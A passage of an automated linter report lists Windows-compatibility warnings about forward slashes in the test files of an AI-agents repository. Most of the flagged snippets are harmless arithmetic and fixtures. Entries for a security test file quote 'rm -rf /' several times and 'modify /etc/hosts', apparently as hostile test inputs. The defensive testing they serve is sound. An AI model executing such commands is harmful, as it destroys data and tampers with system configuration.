        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 631: Forward slash in path - '] / 0.10\n        }\n        \n        # Calculate cost optimization\n        cost_savings = baseline_costs['",
        "timestamp": "2025-09-05T17:30:42.219987"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 635: Forward slash in path - ']\n        cost_optimization_rate = cost_savings / baseline_costs['",
        "timestamp": "2025-09-05T17:30:42.220004"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 640: Forward slash in path - '] - 1) * 0.1  # Time value\n        \n        total_value = cost_savings + quality_value + speed_value\n        roi = total_value / autonomous_costs['",
        "timestamp": "2025-09-05T17:30:42.220027"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "warning": "Line 683: Forward slash in path - ']:\n                completeness = 0.85  # Advanced capabilities\n            else:\n                completeness = 0.80  # Basic automation\n                \n            automation_completeness[stage] = completeness\n        \n        # Calculate overall automation completeness\n        overall_completeness = sum(automation_completeness.values()) / len(automation_completeness)\n        \n        # Identify areas needing human intervention\n        manual_intervention_needed = [\n            stage for stage, completeness in automation_completeness.items() \n            if completeness < 0.90\n        ]\n        \n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.220077"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 96: Forward slash in path - \": self.total_execution_time / self.execution_count,\n            \"",
        "timestamp": "2025-09-05T17:30:42.220456"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 99: Forward slash in path - \": self.error_count / self.execution_count\n        }\n\n\nclass TestConcurrentAgentPerformance:\n    \"",
        "timestamp": "2025-09-05T17:30:42.220469"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 139: Forward slash in path - \")\n        \n        # Test concurrent simple task execution\n        start_time = time.perf_counter()\n        execution_tasks = [agent.execute_simple_task() for agent in agents]\n        results = await asyncio.gather(*execution_tasks, return_exceptions=True)\n        execution_time = time.perf_counter() - start_time\n        \n        # Analyze results\n        successful_results = [r for r in results if not isinstance(r, Exception)]\n        failed_results = [r for r in results if isinstance(r, Exception)]\n        \n        success_rate = len(successful_results) / len(results)\n        throughput = len(successful_results) / execution_time\n        \n        # Performance assertions\n        assert success_rate >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.220500"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 156: Forward slash in path - \"Throughput {throughput} ops/sec below 500\"",
        "timestamp": "2025-09-05T17:30:42.220508"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 159: Forward slash in path - \"Throughput: {throughput:.1f} ops/sec\"",
        "timestamp": "2025-09-05T17:30:42.220516"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 170: Forward slash in path - \") for i in range(num_agents)]\n        for agent in agents:\n            await orchestrator.register_agent(agent)\n        \n        # Sustained load test\n        start_time = time.perf_counter()\n        end_time = start_time + duration_seconds\n        \n        completed_tasks = 0\n        performance_samples = []\n        \n        while time.perf_counter() < end_time:\n            sample_start = time.perf_counter()\n            \n            # Execute batch of tasks\n            batch_tasks = [\n                agents[i % len(agents)].execute_simple_task() \n                for i in range(50)\n            ]\n            \n            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)\n            successful_batch = [r for r in batch_results if not isinstance(r, Exception)]\n            \n            sample_time = time.perf_counter() - sample_start\n            batch_throughput = len(successful_batch) / sample_time\n            \n            performance_samples.append({\n                \"",
        "timestamp": "2025-09-05T17:30:42.220535"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 199: Forward slash in path - \": psutil.Process().memory_info().rss / 1024 / 1024\n            })\n            \n            completed_tasks += len(successful_batch)\n            \n            # Brief pause to prevent overwhelming\n            await asyncio.sleep(0.1)\n        \n        total_time = time.perf_counter() - start_time\n        avg_throughput = completed_tasks / total_time\n        \n        # Analyze performance stability\n        throughput_values = [sample[\"",
        "timestamp": "2025-09-05T17:30:42.220548"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 211: Forward slash in path - \"] for sample in performance_samples]\n        throughput_std = statistics.stdev(throughput_values)\n        throughput_cv = throughput_std / statistics.mean(throughput_values)\n        \n        # Performance assertions\n        assert avg_throughput >= 100, f\"",
        "timestamp": "2025-09-05T17:30:42.220561"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 220: Forward slash in path - \"Average throughput: {avg_throughput:.1f} ops/sec\"",
        "timestamp": "2025-09-05T17:30:42.220572"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 226: Forward slash in path - \"\n        initial_memory = psutil.Process().memory_info().rss / 1024 / 1024  # MB\n        \n        # Test different agent counts\n        agent_counts = [100, 500, 1000]\n        memory_measurements = []\n        \n        for agent_count in agent_counts:\n            # Clean up previous agents\n            gc.collect()\n            \n            # Create new agents\n            agents = [\n                PerformanceTestAgent(f\"",
        "timestamp": "2025-09-05T17:30:42.220589"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 239: Forward slash in path - \") \n                for i in range(agent_count)\n            ]\n            \n            for agent in agents:\n                await orchestrator.register_agent(agent)\n            \n            # Execute some tasks to stabilize memory usage\n            tasks = [agent.execute_simple_task() for agent in agents[:50]]\n            await asyncio.gather(*tasks)\n            \n            current_memory = psutil.Process().memory_info().rss / 1024 / 1024\n            memory_per_agent = (current_memory - initial_memory) / agent_count\n            \n            memory_measurements.append({\n                \"",
        "timestamp": "2025-09-05T17:30:42.220603"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 263: Forward slash in path - \"] / \n            memory_measurements[0][\"",
        "timestamp": "2025-09-05T17:30:42.220618"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 396: Forward slash in path - \"))\n        \n        # Execute all operations concurrently\n        start_time = time.perf_counter()\n        results = await asyncio.gather(*operations, return_exceptions=True)\n        execution_time = time.perf_counter() - start_time\n        \n        # Analyze results\n        successful_ops = [r for r in results if not isinstance(r, Exception)]\n        success_rate = len(successful_ops) / len(results)\n        throughput = len(successful_ops) / execution_time\n        \n        # Coherence assertions\n        assert success_rate >= 0.95, f\"",
        "timestamp": "2025-09-05T17:30:42.220705"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 410: Forward slash in path - \"Throughput {throughput:.1f} ops/sec below 50\"",
        "timestamp": "2025-09-05T17:30:42.220718"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 415: Forward slash in path - \"  Throughput: {throughput:.1f} ops/sec\"",
        "timestamp": "2025-09-05T17:30:42.220732"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 481: Forward slash in path - ']:.1f} ops/sec\"",
        "timestamp": "2025-09-05T17:30:42.220782"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 490: Forward slash in path - \"Running improvement cycle {cycle + 1}/{improvement_cycles}\"",
        "timestamp": "2025-09-05T17:30:42.220799"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 514: Forward slash in path - ']\n        ) / baseline_metrics['",
        "timestamp": "2025-09-05T17:30:42.220822"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 518: Forward slash in path - ']\n        ) / baseline_metrics['",
        "timestamp": "2025-09-05T17:30:42.220838"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 519: Forward slash in path - ']\n        \n        overall_improvement = (response_time_improvement + throughput_improvement) / 2\n        \n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.220852"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 525: Forward slash in path - ']:.1f} ops/sec\"",
        "timestamp": "2025-09-05T17:30:42.220868"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 543: Forward slash in path - '] for r in successful_results]\n        avg_response_time = statistics.mean(response_times)\n        throughput = len(successful_results) / total_time\n        success_rate = len(successful_results) / len(results)\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.220895"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 620: Forward slash in path - \"\n        orchestrator = AutonomousMetaOrchestrator()\n        await orchestrator.initialize()\n        \n        initial_memory = psutil.Process().memory_info().rss / 1024 / 1024  # MB\n        memory_samples = [initial_memory]\n        \n        # Run extended operations\n        agents = [PerformanceTestAgent(f\"",
        "timestamp": "2025-09-05T17:30:42.220947"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 628: Forward slash in path - \") for i in range(100)]\n        \n        for iteration in range(20):\n            # Create and destroy agents to test cleanup\n            for agent in agents:\n                await orchestrator.register_agent(agent)\n            \n            # Execute tasks\n            tasks = [agent.execute_simple_task() for agent in agents]\n            await asyncio.gather(*tasks)\n            \n            # Cleanup agents\n            for agent in agents:\n                await orchestrator.unregister_agent(agent.agent_id)\n            \n            # Force garbage collection\n            gc.collect()\n            \n            # Sample memory\n            current_memory = psutil.Process().memory_info().rss / 1024 / 1024\n            memory_samples.append(current_memory)\n            \n            await asyncio.sleep(0.1)\n        \n        # Analyze memory trend\n        final_memory = memory_samples[-1]\n        memory_growth = final_memory - initial_memory\n        \n        # Linear regression to detect trend\n        x = list(range(len(memory_samples)))\n        y = memory_samples\n        n = len(x)\n        \n        slope = (n * sum(x_i * y_i for x_i, y_i in zip(x, y)) - sum(x) * sum(y)) / (n * sum(x_i * x_i for x_i in x) - sum(x) ** 2)\n        \n        # Memory leak assertions\n        assert memory_growth < 50, f\"",
        "timestamp": "2025-09-05T17:30:42.220974"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 665: Forward slash in path - \"Memory growth rate {slope:.2f}MB/iteration suggests leak\"",
        "timestamp": "2025-09-05T17:30:42.220991"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "warning": "Line 667: Forward slash in path - \"Memory analysis: growth {memory_growth:.1f}MB, rate {slope:.2f}MB/iteration\"",
        "timestamp": "2025-09-05T17:30:42.221008"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Line 139: Forward slash in path - 'rm -rf /'",
        "timestamp": "2025-09-05T17:30:42.221360"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Line 201: Forward slash in path - \"modify /etc/hosts\"",
        "timestamp": "2025-09-05T17:30:42.221403"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Line 282: Forward slash in path - 'rm -rf /'",
        "timestamp": "2025-09-05T17:30:42.221454"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "warning": "Line 572: Forward slash in path - 'rm -rf /'",
        "timestamp": "2025-09-05T17:30:42.221628"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Line 99: Forward slash in path - \"\n        if not self.performance_history:\n            return 0.0\n            \n        # Composite performance score\n        def performance_score(perf):\n            return (\n                (1.0 / perf['",
        "timestamp": "2025-09-05T17:30:42.222065"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Line 109: Forward slash in path - ']) * 0.4  # Lower error rate is better\n            )\n            \n        baseline_score = performance_score(self.baseline_performance)\n        current_score = performance_score(self.current_performance)\n        \n        improvement = (current_score - baseline_score) / baseline_score\n        return improvement\n        \n    def get_performance_metrics(self) -> Dict[str, float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.222080"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Line 208: Forward slash in path - '] for r in modified_tasks)\n        \n        # Should see performance improvement\n        time_improvement = (baseline_avg_time - modified_avg_time) / baseline_avg_time\n        assert time_improvement > 0.15, f\"",
        "timestamp": "2025-09-05T17:30:42.222137"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Line 269: Forward slash in path - '] > 1.2\n        \n        # Test enhanced learning\n        enhanced_learning_rate = await agent.measure_learning_rate()\n        \n        learning_improvement = (enhanced_learning_rate - baseline_learning_rate) / baseline_learning_rate\n        assert learning_improvement > 0.25, f\"",
        "timestamp": "2025-09-05T17:30:42.222179"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Line 327: Forward slash in path - \"\\nEvolution cycle {cycle + 1}/{evolution_cycles}\"",
        "timestamp": "2025-09-05T17:30:42.222216"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Line 367: Forward slash in path - \"  Agents meeting target: {agents_meeting_target}/{len(evolving_agents)}\"",
        "timestamp": "2025-09-05T17:30:42.222248"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "warning": "Line 494: Forward slash in path - ': 0.2}\n        )\n        \n        # Baseline measurements across all objectives\n        baseline_scores = {}\n        for agent in evolving_agents:\n            for _ in range(10):\n                await agent.execute_benchmark_task(0.5)\n            baseline_scores[agent.agent_id] = await evolution_system.calculate_multi_objective_score(agent)\n        \n        # Run multi-objective evolution\n        for cycle in range(6):\n            improvements = await evolution_system.generate_multi_objective_improvements(evolving_agents)\n            \n            for agent_id, improvement in improvements.items():\n                agent = next(a for a in evolving_agents if a.agent_id == agent_id)\n                await agent.apply_performance_modification(improvement)\n            \n            for agent in evolving_agents:\n                for _ in range(5):\n                    await agent.execute_benchmark_task(0.5)\n        \n        # Final multi-objective scores\n        final_scores = {}\n        for agent in evolving_agents:\n            final_scores[agent.agent_id] = await evolution_system.calculate_multi_objective_score(agent)\n        \n        # Verify improvement across objectives\n        improvements = []\n        for agent_id in baseline_scores:\n            baseline = baseline_scores[agent_id]\n            final = final_scores[agent_id]\n            improvement = (final - baseline) / baseline if baseline > 0 else 0\n            improvements.append(improvement)\n        \n        avg_multi_objective_improvement = statistics.mean(improvements)\n        \n        assert avg_multi_objective_improvement > 0.12, f\"",
        "timestamp": "2025-09-05T17:30:42.222348"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent.py",
        "warning": "Line 15: Forward slash in path - \", context={})\n    assert isinstance(thought, Thought)\n    assert thought.strategy in agent._get_available_strategies()\n\n    # Act/Execute/Observe via pipeline\n    result = await agent.process_task(task=\"",
        "timestamp": "2025-09-05T17:30:42.222947"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Line 447: Forward slash in path - '/'",
        "timestamp": "2025-09-05T17:30:42.223502"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Line 489: Forward slash in path - \"\n        import psutil\n        import os\n        \n        process = psutil.Process(os.getpid())\n        initial_memory = process.memory_info().rss / 1024 / 1024  # MB\n        \n        # Process many tasks\n        for i in range(100):\n            await simple_agent.process_task(f\"",
        "timestamp": "2025-09-05T17:30:42.223539"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Line 498: Forward slash in path - \")\n        \n        final_memory = process.memory_info().rss / 1024 / 1024  # MB\n        memory_increase = final_memory - initial_memory\n        \n        # Memory increase should be reasonable (less than 50MB for 100 tasks)\n        assert memory_increase < 50, f\"",
        "timestamp": "2025-09-05T17:30:42.223556"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_base_agent_comprehensive.py",
        "warning": "Line 515: Forward slash in path - \")\n        \n        end_time = time.perf_counter()\n        total_time = end_time - start_time\n        average_time = total_time / 20\n        \n        # Each task should complete in reasonable time\n        assert average_time < 0.1, f\"",
        "timestamp": "2025-09-05T17:30:42.223576"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_invoice_processor.py",
        "warning": "Line 26: Forward slash in path - \"\n    ACME CORPORATION\n    123 Business Street\n    New York, NY 10001\n    \n    INVOICE\n    \n    Invoice Number: INV-2024-001\n    Invoice Date: 01/15/2024\n    Due Date: 02/14/2024\n    \n    Bill To:\n    XYZ Company\n    456 Client Avenue\n    Los Angeles, CA 90001\n    \n    Description                 Quantity    Unit Price    Total\n    Professional Services           10         $150.00   $1,500.00\n    Consulting Hours                5          $200.00   $1,000.00\n    \n    Subtotal:                                           $2,500.00\n    Tax (8.25%):                                         $206.25\n    Total Amount:                                      $2,706.25\n    \n    Payment Terms: Net 30\n    \"",
        "timestamp": "2025-09-05T17:30:42.223849"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_invoice_processor.py",
        "warning": "Line 84: Forward slash in path - \"Invoice #123 Date: 01/01/2024 Total: $100.00 Vendor: ACME Corp\"",
        "timestamp": "2025-09-05T17:30:42.223868"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_invoice_processor.py",
        "warning": "Line 168: Forward slash in path - \"Invoice #123 Date: 01/01/2024 Total: $100.00 Vendor: Test Corp\"",
        "timestamp": "2025-09-05T17:30:42.223910"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_invoice_processor.py",
        "warning": "Line 202: Forward slash in path - \"Invoice #999 Date: 12/25/2023 Total: $555.00 Vendor: Test Vendor\"",
        "timestamp": "2025-09-05T17:30:42.223931"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_invoice_processor.py",
        "warning": "Line 256: Forward slash in path - \"\n        Test Company\n        Invoice #ABC123\n        Date: 01/01/2024\n        Total: $250.00\n        \"",
        "timestamp": "2025-09-05T17:30:42.223959"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Line 495: Forward slash in path - \"\n        import psutil\n        import os\n        \n        process = psutil.Process(os.getpid())\n        initial_memory = process.memory_info().rss / 1024 / 1024  # MB\n        \n        # Register many agents\n        extended_agents = mock_agents * 10  # 40 agents total\n        for agent in extended_agents:\n            orchestrator.register_agent(agent)\n        \n        # Process tasks with all agents\n        for i in range(20):\n            task = Task(\n                id=f\"",
        "timestamp": "2025-09-05T17:30:42.224704"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "warning": "Line 512: Forward slash in path - \": i}\n            )\n            await orchestrator.delegate_task(task)\n        \n        final_memory = process.memory_info().rss / 1024 / 1024  # MB\n        memory_increase = final_memory - initial_memory\n        \n        # Memory usage should be reasonable\n        assert memory_increase < 100  # Less than 100MB increase\n\n\nclass TestErrorHandlingAndRecovery(TestAgentOrchestrator):\n    \"",
        "timestamp": "2025-09-05T17:30:42.224726"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_utils_comprehensive.py",
        "warning": "Line 362: Forward slash in path - \": i},\n                success=i % 2 == 0,  # Alternate success/failure\n                learnings=[f\"",
        "timestamp": "2025-09-05T17:30:42.225264"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_utils_comprehensive.py",
        "warning": "Line 378: Forward slash in path - \"Test semantic memory save/retrieve operations\"",
        "timestamp": "2025-09-05T17:30:42.225292"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_utils_comprehensive.py",
        "warning": "Line 453: Forward slash in path - \"/definitely/not/a/valid/path/test.db\"",
        "timestamp": "2025-09-05T17:30:42.225390"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_utils_comprehensive.py",
        "warning": "Line 665: Forward slash in path - '/'",
        "timestamp": "2025-09-05T17:30:42.225567"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 24: Forward slash in path - 'test_reports/reasoning_test_execution.log'",
        "timestamp": "2025-09-05T17:30:42.225973"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 183: Forward slash in path - \"--cov-report=html:test_reports/{suite_name}_coverage\"",
        "timestamp": "2025-09-05T17:30:42.226053"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 191: Forward slash in path - \"test_reports/{suite_name}_results.json\"",
        "timestamp": "2025-09-05T17:30:42.226064"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 229: Forward slash in path - \", 0) / max(1, json_report[\"",
        "timestamp": "2025-09-05T17:30:42.226094"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 343: Forward slash in path - \", 0) for r in results.values())\n        \n        if total_tests > 0:\n            overall_success_rate = total_passed / total_tests\n            assessment[\"",
        "timestamp": "2025-09-05T17:30:42.226166"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 369: Forward slash in path - \": passed_targets / max(1, total_targets)\n        }\n        \n        return assessment\n    \n    def generate_recommendations(self, results: Dict[str, Any]) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.226194"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 412: Forward slash in path - \"test_reports/comprehensive_reasoning_test_report.json\"",
        "timestamp": "2025-09-05T17:30:42.226229"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 427: Forward slash in path - \"\n        <!DOCTYPE html>\n        <html>\n        <head>\n            <title>Reasoning Systems Test Report</title>\n            <style>\n                body {{ font-family: Arial, sans-serif; margin: 20px; }}\n                .header {{ background-color: #f0f0f0; padding: 20px; border-radius: 5px; }}\n                .success {{ color: green; font-weight: bold; }}\n                .failure {{ color: red; font-weight: bold; }}\n                .warning {{ color: orange; font-weight: bold; }}\n                .metric {{ margin: 10px 0; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }}\n                table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}\n                th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}\n                th {{ background-color: #f2f2f2; }}\n                .passed {{ background-color: #d4edda; }}\n                .failed {{ background-color: #f8d7da; }}\n            </style>\n        </head>\n        <body>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.226257"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 447: Forward slash in path - \">\n                <h1>Phase 7 Reasoning Systems Test Report</h1>\n                <p>Generated: {datetime.now().isoformat()}</p>\n                <p>Total Execution Time: {self.test_results['",
        "timestamp": "2025-09-05T17:30:42.226273"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 450: Forward slash in path - ']:.1f} seconds</p>\n            </div>\n            \n            <h2>Execution Summary</h2>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.226288"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 454: Forward slash in path - \">\n                <strong>Overall Success:</strong> \n                <span class=\"",
        "timestamp": "2025-09-05T17:30:42.226302"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 457: Forward slash in path - '}\n                </span>\n            </div>\n            \n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.226321"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 461: Forward slash in path - \">\n                <strong>Suites Executed:</strong> {self.test_results['",
        "timestamp": "2025-09-05T17:30:42.226335"
      },
      {
        "category": "WINDOWS_COMPAT",
